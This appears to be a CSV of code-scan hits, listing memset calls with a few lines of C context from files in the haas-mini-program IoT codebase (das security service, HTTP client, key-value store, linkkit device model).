2021\haas-mini-program\adapter\platform\linux\network\amp_cellular.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\network\amp_cellular.c,"memset(sim_info, 0x0, sizeof(amp_sim_info_t));",120,1,"    char iccid[24] = {0};

    memset(sim_info, 0x0, sizeof(amp_sim_info_t));

    memcpy(sim_info->imsi, imsi, 24);
"
2021\haas-mini-program\adapter\platform\linux\network\amp_cellular.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\network\amp_cellular.c,"memset(locator_info, 0x0, sizeof(amp_locator_info_t));",120,1,"    char mnc[4] = {0};

    memset(locator_info, 0x0, sizeof(amp_locator_info_t));

    memcpy(locator_info->mcc, mcc, 4);
"
2021\haas-mini-program\components\das\src\core\das_core.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\core\das_core.c,"memset(&ss->report, 0, sizeof(Message));",120,1,"        void (*publish_handle)(das_session_t *, bool) = NULL;

        memset(&ss->report, 0, sizeof(Message));

        switch (ss->step) {
"
2021\haas-mini-program\components\das\src\core\proto\pb_decode.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\core\proto\pb_decode.c,"memset(iter->pData, 0, iter->pos->data_size);",120,1,"                /* We memset to zero so that any callbacks are set to NULL.
                 * Then set any default values. */
                memset(iter->pData, 0, iter->pos->data_size);
                pb_message_set_to_defaults((const pb_field_t*)iter->pos->ptr, iter->pData);
            }
"
2021\haas-mini-program\components\das\src\core\proto\pb_decode.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\core\proto\pb_decode.c,"memset(pItem, 0, iter->pos->data_size);",120,1,"        /* We memset to zero so that any callbacks are set to NULL.
         * Then set any default values. */
        memset(pItem, 0, iter->pos->data_size);
        pb_message_set_to_defaults((const pb_field_t *) iter->pos->ptr, pItem);
    }
"
2021\haas-mini-program\components\das\src\core\proto\pb_decode.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\core\proto\pb_decode.c,"memset(dest, 0, field->data_size);",120,1,"    {
        /* As a special case, treat empty bytes string as all zeros for fixed_length_bytes. */
        memset(dest, 0, field->data_size);
        return true;
    }
"
2021\haas-mini-program\components\das\src\service\service_fscan.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_fscan.c,"memset(&fscan_ctx, 0, sizeof(fscan_context_t));",120,1,"    protected_array_index = 0;

    memset(&fscan_ctx, 0, sizeof(fscan_context_t));

    scan_paths_cnt = 0;
"
2021\haas-mini-program\components\das\src\service\service_fscan.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_fscan.c,"memset(scan_paths, 0, sizeof(char *) * scan_paths_max_cnt);",120,1,"
    scan_paths_cnt = 0;
    memset(scan_paths, 0, sizeof(char *) * scan_paths_max_cnt);
}

"
2021\haas-mini-program\components\das\src\service\service_fscan.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_fscan.c,"memset(scan_paths, 0, scan_paths_max_cnt * sizeof(char *));",120,1,"            if (S_ISDIR(s_buf.st_mode)) {
                scan_paths_cnt = 0;
                memset(scan_paths, 0, scan_paths_max_cnt * sizeof(char *));

                _extract_dir(dir);
"
2021\haas-mini-program\components\das\src\service\service_lwip_nfi.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_lwip_nfi.c,"memset(netflow_infos, 0, sizeof(netflow_info_t) * DAS_SERVICE_NFI_MAX_INFO_CNT);",120,1,"static int _lwip_nfi_init(void)
{
	memset(netflow_infos, 0, sizeof(netflow_info_t) * DAS_SERVICE_NFI_MAX_INFO_CNT);

#ifdef DAS_PLATFORM_FREERTOS
"
2021\haas-mini-program\components\das\src\service\service_lwip_nfi.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_lwip_nfi.c,"memset(tmp_buf, 0, 16);",120,1,"	buf[off] = FIELDS_SEPARATE_TAG;
	off++;
	memset(tmp_buf, 0, 16);

	// remote ip
"
2021\haas-mini-program\components\das\src\service\service_lwip_nfi.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_lwip_nfi.c,"memset(pinfo, 0, sizeof(netflow_info_t));",120,1,"    }
	
	memset(pinfo, 0, sizeof(netflow_info_t));

	pinfo->local_ip = local_ip;
"
2021\haas-mini-program\components\das\src\service\service_rom.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_rom.c,"memset(&rom_ctx, 0, sizeof(rom_context_t));",120,1,"static int _rom_init(void)
{
    memset(&rom_ctx, 0, sizeof(rom_context_t));

    das_hal_rom_info(rom_ctx.banks);
"
2021\haas-mini-program\components\das\src\service\service_sys.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_sys.c,"memset(buffer, 0, size);",120,1,"    }

    memset(buffer, 0, size);
    
    memcpy(buffer + offset, SYS_INFO_KEY_SP, len);
"
2021\haas-mini-program\components\das\src\service\service_sys.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_sys.c,"memset(das_function_stack_hash, 0, sizeof(das_function_stack_hash_t) * DAS_SERVICE_SP_TRACE_MAX_FUNCTION_CNT);",120,1,"static int _stack_protection_init(void)
{
	memset(das_function_stack_hash, 0, sizeof(das_function_stack_hash_t) * DAS_SERVICE_SP_TRACE_MAX_FUNCTION_CNT);
    memset(das_stack_trace_report_buf, 0, sizeof(das_stack_trace_report_buf_t) * DAS_SERVICE_SP_TRACE_MAX_REPORT_BUF_CNT);

"
2021\haas-mini-program\components\das\src\service\service_sys.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_sys.c,"memset(das_stack_trace_report_buf, 0, sizeof(das_stack_trace_report_buf_t) * DAS_SERVICE_SP_TRACE_MAX_REPORT_BUF_CNT);",120,1,"{
	memset(das_function_stack_hash, 0, sizeof(das_function_stack_hash_t) * DAS_SERVICE_SP_TRACE_MAX_FUNCTION_CNT);
    memset(das_stack_trace_report_buf, 0, sizeof(das_stack_trace_report_buf_t) * DAS_SERVICE_SP_TRACE_MAX_REPORT_BUF_CNT);

#ifdef DAS_PLATFORM_FREERTOS
"
2021\haas-mini-program\components\das\src\service\service_sys.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\service_sys.c,"memset(pinfo, 0, sizeof(das_stack_trace_report_buf_t));",120,1,"
                // clean the local report info store buffer
                memset(pinfo, 0, sizeof(das_stack_trace_report_buf_t));
			} else {
                exit = 1;
"
2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,"memset(cf, 0, sizeof(custom_info_entry_t));",120,1,"                        int lock = 1;
                        
                        memset(cf, 0, sizeof(custom_info_entry_t));
                        strncpy(cf->buf, buf, len);
                        cf->ret_size = len;
"
2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,"memset(buf, 0, size * sizeof(char));",120,1,"    }

    memset(buf, 0, size * sizeof(char));

    // prefix: ""netflow:""
"
2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,"memset(nf, 0, sizeof(netflow_info_entry_t));",120,1,"        netflow_info_entry_t *nf = (netflow_info_entry_t *)malloc(sizeof(netflow_info_entry_t));
        if (nf) {
            memset(nf, 0, sizeof(netflow_info_entry_t));

            nf->info.domain = ct->head.orig.l3protonum;
"
2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,"memset(&addr, 0, sizeof(addr));",120,1,"	}

	memset(&addr, 0, sizeof(addr));
	addr.sll_ifindex = if_nametoindex(name);
	addr.sll_family = AF_PACKET;
"
2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\das\src\service\netfilter\service_netfilter.c,"memset(buffer, 0, size * sizeof(char));",120,1,"        }
    } else {
        memset(buffer, 0, size * sizeof(char));
    }

"
2021\haas-mini-program\components\http\src\http_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_client.c,"memset(&http_sessions[index], 0, sizeof(http_sessions[index]));",120,1,"    }

    memset(&http_sessions[index], 0, sizeof(http_sessions[index]));
    http_sessions[index].socket = -1;
    if (settings->server_name == NULL ||
"
2021\haas-mini-program\components\http\src\http_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_client.c,"memset(http_sessions[index].server_name, 0, sizeof(http_sessions[index].server_name));",120,1,"        }
    }
    memset(http_sessions[index].server_name, 0, sizeof(http_sessions[index].server_name));
    strncpy(http_sessions[index].server_name, param.param, param.len + 1);

"
2021\haas-mini-program\components\http\src\http_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_client.c,"memset(http_sessions[index].server_name + param.len, 0, strlen(http_sessions[index].server_name) - param.len);",120,1,"            goto exit;
        }
        memset(http_sessions[index].server_name + param.len, 0, strlen(http_sessions[index].server_name) - param.len);
    } else {
        memset(http_sessions[index].server_name, 0, sizeof(http_sessions[index].server_name));
"
2021\haas-mini-program\components\http\src\http_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_client.c,"memset(http_session, 0, sizeof(httpc_t));",120,1,"#endif
    httpc_wrapper_lock_mutex();
    memset(http_session, 0, sizeof(httpc_t));
    http_session->socket = -1;
    httpc_wrapper_unlock_mutex();
"
2021\haas-mini-program\components\http\src\http_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_client.c,"memset(content_len_str, 0, HTTP_CONTENT_LEN_SIZE);",120,1,"    }

    memset(content_len_str, 0, HTTP_CONTENT_LEN_SIZE);
    snprintf(content_len_str, HTTP_CONTENT_LEN_SIZE, ""%d"", param_len);
    ret = httpc_add_request_header(httpc, ""Content-Length"", content_len_str);
"
2021\haas-mini-program\components\http\src\http_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_client.c,"memset(http_session->req.buf, 0, http_session->req.buf_size);",120,1,"    http_session->rsp.headers_complete = 0;

    memset(http_session->req.buf, 0, http_session->req.buf_size);
    http_session->req.data_len = 0;

"
2021\haas-mini-program\components\http\src\http_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_client.c,"memset(http_sessions, 0, sizeof(http_sessions));",120,1,"    uint8_t index;

    memset(http_sessions, 0, sizeof(http_sessions));
    for (index = 0; index < CONFIG_HTTPC_SESSION_NUM; index++) {
        http_sessions[index].socket = -1;
"
2021\haas-mini-program\components\http\src\http_parser.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_parser.c,"memset(parser, 0, sizeof(*parser));",120,1,"{
  void *data = parser->data; /* preserve application data */
  memset(parser, 0, sizeof(*parser));
  parser->data = data;
  parser->type = t;
"
2021\haas-mini-program\components\http\src\http_parser.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_parser.c,"memset(settings, 0, sizeof(*settings));",120,1,"http_parser_settings_init(http_parser_settings *settings)
{
  memset(settings, 0, sizeof(*settings));
}

"
2021\haas-mini-program\components\http\src\http_parser.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\http\src\http_parser.c,"memset(u, 0, sizeof(*u));",120,1,"void
http_parser_url_init(struct http_parser_url *u) {
  memset(u, 0, sizeof(*u));
}

"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(&hdr, 0, sizeof(block_hdr_t));",120,1,"    kv_size_t pos = (blk_idx << KV_BLOCK_SIZE_BITS);

    memset(&hdr, 0, sizeof(block_hdr_t));
    hdr.magic = KV_BLOCK_MAGIC_NUM;

"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(&hdr, 0, KV_ITEM_HDR_SIZE);",120,1,"    } else if (flag == KV_UPDATE_FLAG) {
        off = item->hdr.origin_off;
        memset(&hdr, 0, KV_ITEM_HDR_SIZE);
        if (kv_flash_read(off, &hdr, KV_ITEM_HDR_SIZE) != KV_OK) {
            return KV_ERR_FLASH_READ;
"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(key, 0, item->hdr.key_len + 1);",120,1,"    }

    memset(key, 0, item->hdr.key_len + 1);
    kv_flash_read(item->pos + KV_ITEM_HDR_SIZE, key, item->hdr.key_len);

"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(store.p, 0, store.len);",120,1,"    }

    memset(store.p, 0, store.len);
    p = store.p + KV_ITEM_HDR_SIZE;

"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(&hdr, 0, KV_BLOCK_HDR_SIZE);",120,1,"
    for (i = 0; i < KV_BLOCK_NUMS; i++) {
        memset(&hdr, 0, KV_BLOCK_HDR_SIZE);
        kv_flash_read((i << KV_BLOCK_SIZE_BITS), &hdr, KV_BLOCK_HDR_SIZE);
        if (hdr.magic == KV_BLOCK_MAGIC_NUM) {
"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(item, 0, sizeof(kv_item_t));",120,1,"        }

        memset(item, 0, sizeof(kv_item_t));
        hdr = &(item->hdr);

"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(&g_kv_mgr, 0, sizeof(kv_mgr_t));",120,1,"    }

    memset(&g_kv_mgr, 0, sizeof(kv_mgr_t));

    g_kv_mgr.lock = kv_lock_create();
"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(data, 0, len);",120,1,"    }

    memset(data, 0, len);

    res = kv_secure_encrypt((uint8_t *)val, data, len);
"
2021\haas-mini-program\components\kv\kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv.c,"memset(data, 0, item->hdr.val_len);",120,1,"        }

        memset(data, 0, item->hdr.val_len);

        res = kv_secure_decrypt((uint8_t *)(item->store + item->hdr.key_len), data, item->hdr.val_len);
"
2021\haas-mini-program\components\kv\kv_adapt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\kv\kv_adapt.c,"memset(&param, 0, sizeof(param));",120,1,"	int stack_used = stack;

	memset(&param, 0, sizeof(param));
    param.name = name;
    param.priority = amp_get_default_task_priority();
"
2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,"memset(ctx, 0, sizeof(dm_api_ctx_t));",120,1,"    lite_cjson_hooks hooks;
#endif
    memset(ctx, 0, sizeof(dm_api_ctx_t));

#if defined(ALCS_ENABLED) || defined(DEPRECATED_LINKKIT)
"
2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,"memset(method, 0, method_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(method, 0, method_len);
    amp_snprintf(method, method_len, method_fmt, identifier_len, identifier);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,"memset(dapi_property, 0, sizeof(dm_api_property_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(dapi_property, 0, sizeof(dm_api_property_t));


"
2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_api.c,"memset(search_node->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);",120,1,"            return FAIL_RETURN;
        }
        memset(search_node->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);
        memcpy(search_node->device_secret, device_secret, strlen(device_secret));
        _dm_api_unlock();
"
2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,"memset(&source, 0, sizeof(dm_msg_source_t));",120,1,"    dm_msg_source_t source;

    memset(&source, 0, sizeof(dm_msg_source_t));

    source.uri = topic;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,"memset(&dest, 0, sizeof(dm_msg_dest_t));",120,1,"
    memset(&source, 0, sizeof(dm_msg_source_t));
    memset(&dest, 0, sizeof(dm_msg_dest_t));
    memset(&request, 0, sizeof(dm_msg_request_payload_t));
    memset(&response, 0, sizeof(dm_msg_response_t));
"
2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,"memset(&request, 0, sizeof(dm_msg_request_payload_t));",120,1,"    memset(&source, 0, sizeof(dm_msg_source_t));
    memset(&dest, 0, sizeof(dm_msg_dest_t));
    memset(&request, 0, sizeof(dm_msg_request_payload_t));
    memset(&response, 0, sizeof(dm_msg_response_t));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client.c,"memset(&response, 0, sizeof(dm_msg_response_t));",120,1,"    memset(&dest, 0, sizeof(dm_msg_dest_t));
    memset(&request, 0, sizeof(dm_msg_request_payload_t));
    memset(&response, 0, sizeof(dm_msg_response_t));

    source.uri = topic;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,"memset(ctx, 0, sizeof(dm_client_ctx_t));",120,1,"    iotx_cm_init_param_t cm_param;

    memset(ctx, 0, sizeof(dm_client_ctx_t));
    memset(&cm_param, 0, sizeof(iotx_cm_init_param_t));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,"memset(&cm_param, 0, sizeof(iotx_cm_init_param_t));",120,1,"
    memset(ctx, 0, sizeof(dm_client_ctx_t));
    memset(&cm_param, 0, sizeof(iotx_cm_init_param_t));

    cm_param.request_timeout_ms = IOTX_DM_CLIENT_REQUEST_TIMEOUT_MS;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,"memset(&sub_params, 0, sizeof(iotx_cm_ext_params_t));",120,1,"    iotx_cm_ext_params_t sub_params;

    memset(&sub_params, 0, sizeof(iotx_cm_ext_params_t));
    if (context != NULL) {
        local_sub = *((uint8_t *)context);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_client_adapter.c,"memset(&pub_param, 0, sizeof(iotx_cm_ext_params_t));",120,1,"    iotx_cm_ext_params_t pub_param;

    memset(&pub_param, 0, sizeof(iotx_cm_ext_params_t));
    pub_param.ack_type = IOTX_CM_MESSAGE_NO_ACK;
    pub_param.sync_mode = IOTX_CM_ASYNC;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_cota.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_cota.c,"memset(ctx, 0, sizeof(dm_cota_ctx_t));",120,1,"    dm_cota_ctx_t *ctx = dm_cota_get_ctx();

    memset(ctx, 0, sizeof(dm_cota_ctx_t));

    return SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_cota.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_cota.c,"memset(message, 0, message_len);",120,1,"        goto ERROR;
    }
    memset(message, 0, message_len);
    amp_snprintf(message, message_len, cota_new_config_fmt, config_id, config_size, get_type, sign, sign_method, url);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_fota.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_fota.c,"memset(ctx, 0, sizeof(dm_fota_ctx_t));",120,1,"    dm_fota_ctx_t *ctx = dm_fota_get_ctx();

    memset(ctx, 0, sizeof(dm_fota_ctx_t));

    return SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_fota.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_fota.c,"memset(version_str, 0, buffer_len + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(version_str, 0, buffer_len + 1);
    memcpy(version_str, version, buffer_len);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_ipc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_ipc.c,"memset(ctx, 0, sizeof(dm_ipc_t));",120,1,"    dm_ipc_t *ctx = _dm_ipc_get_ctx();

    memset(ctx, 0, sizeof(dm_ipc_t));

    /* Create Mutex */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_ipc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_ipc.c,"memset(node, 0, sizeof(dm_ipc_msg_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(node, 0, sizeof(dm_ipc_msg_node_t));

    node->data = data;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_log_report.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_log_report.c,"memset(g_log_poll, 0, LOG_POLL_SIZE);",120,1,"        return -1;
    }
    memset(g_log_poll, 0, LOG_POLL_SIZE);
    current_log_pos = g_log_poll;
    add_log_header();
"
2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,"memset(node, 0, sizeof(dm_mgr_dev_node_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(node, 0, sizeof(dm_mgr_dev_node_t));

    node->devid = devid;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,"memset(ctx, 0, sizeof(dm_mgr_ctx));",120,1,"    char device_name[IOTX_DEVICE_NAME_LEN + 1] = {0};

    memset(ctx, 0, sizeof(dm_mgr_ctx));

    /* Create Mutex */
"
2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,"memset(node->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);",120,1,"    }

    memset(node->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);
    memcpy(node->device_secret, device_secret, strlen(device_secret));

"
2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,"memset(&request, 0, sizeof(dm_msg_request_t));",120,1,"    }

    memset(&request, 0, sizeof(dm_msg_request_t));
    request.service_prefix = DM_URI_SYS_PREFIX;
    request.service_name = DM_URI_THING_SUB_REGISTER;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_manager.c,"memset(service_name, 0, service_name_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(service_name, 0, service_name_len);
    amp_snprintf(service_name, service_name_len, DM_URI_THING_EVENT_POST, identifier_len, identifier);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(ctx, 0, sizeof(dm_msg_ctx_t));",120,1,"{
    dm_msg_ctx_t *ctx = _dm_msg_get_ctx();
    memset(ctx, 0, sizeof(dm_msg_ctx_t));

    return SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(dipc_msg, 0, sizeof(dm_ipc_msg_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(dipc_msg, 0, sizeof(dm_ipc_msg_t));

    dipc_msg->type = type;
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(request, 0, payload_len + 1);",120,1,"    }

    memset(request, 0, payload_len + 1);
    memcpy(request, payload, payload_len);
    if (g_user_topic_callback) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_message, 0, sizeof(lite_cjson_t));",120,1,"                     response->data.value_length, response->data.value);

    memset(&lite_message, 0, sizeof(lite_cjson_t));
    dm_utils_json_object_item(&lite, DM_MSG_KEY_MESSAGE, strlen(DM_MSG_KEY_MESSAGE), cJSON_Invalid,
                              &response->message);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(payload, 0, payload_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(payload, 0, payload_len);
    amp_snprintf(payload, payload_len, DM_MSG_REQUEST, request->msgid,
                 DM_MSG_VERSION, request->params_len, request->params, request->method);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite, 0, sizeof(lite_cjson_t));",120,1,"                 DM_MSG_VERSION, request->params_len, request->params, request->method);

    memset(&lite, 0, sizeof(lite_cjson_t));
    res = lite_cjson_parse(payload, payload_len, &lite);
    if (res < SUCCESS_RETURN) {
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(ctx_addr_str, 0, sizeof(uintptr_t) * 2 + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(ctx_addr_str, 0, sizeof(uintptr_t) * 2 + 1);

    infra_hex2str((unsigned char *)&ctx_addr_num, sizeof(uintptr_t), ctx_addr_str);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(str_payload, 0, response->message.value_length + 3);",120,1,"                return FAIL_RETURN;
            }
            memset(str_payload, 0, response->message.value_length + 3);
            str_payload[0] = '\""';
            memcpy(str_payload + 1, response->message.value, response->message.value_length);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item, 0, sizeof(lite_cjson_t));",120,1,"        message_len = 0;
        message = NULL;
        memset(&lite_item, 0, sizeof(lite_cjson_t));
        memset(&lite_item_pk, 0, sizeof(lite_cjson_t));
        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item_pk, 0, sizeof(lite_cjson_t));",120,1,"        message = NULL;
        memset(&lite_item, 0, sizeof(lite_cjson_t));
        memset(&lite_item_pk, 0, sizeof(lite_cjson_t));
        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
        memset(product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(&lite_item_dn, 0, sizeof(lite_cjson_t));",120,1,"        memset(&lite_item, 0, sizeof(lite_cjson_t));
        memset(&lite_item_pk, 0, sizeof(lite_cjson_t));
        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
        memset(product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
        memset(device_name, 0, IOTX_DEVICE_NAME_LEN + 1);
"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);",120,1,"        memset(&lite_item_pk, 0, sizeof(lite_cjson_t));
        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
        memset(product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
        memset(device_name, 0, IOTX_DEVICE_NAME_LEN + 1);

"
2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\dm_message.c,"memset(device_name, 0, IOTX_DEVICE_NAME_LEN + 1);",120,1,"        memset(&lite_item_dn, 0, sizeof(lite_cjson_t));
        memset(product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
        memset(device_name, 0, IOTX_DEVICE_NAME_LEN + 1);

        res = lite_cjson_array_item(&lite, index, &lite_item);
"
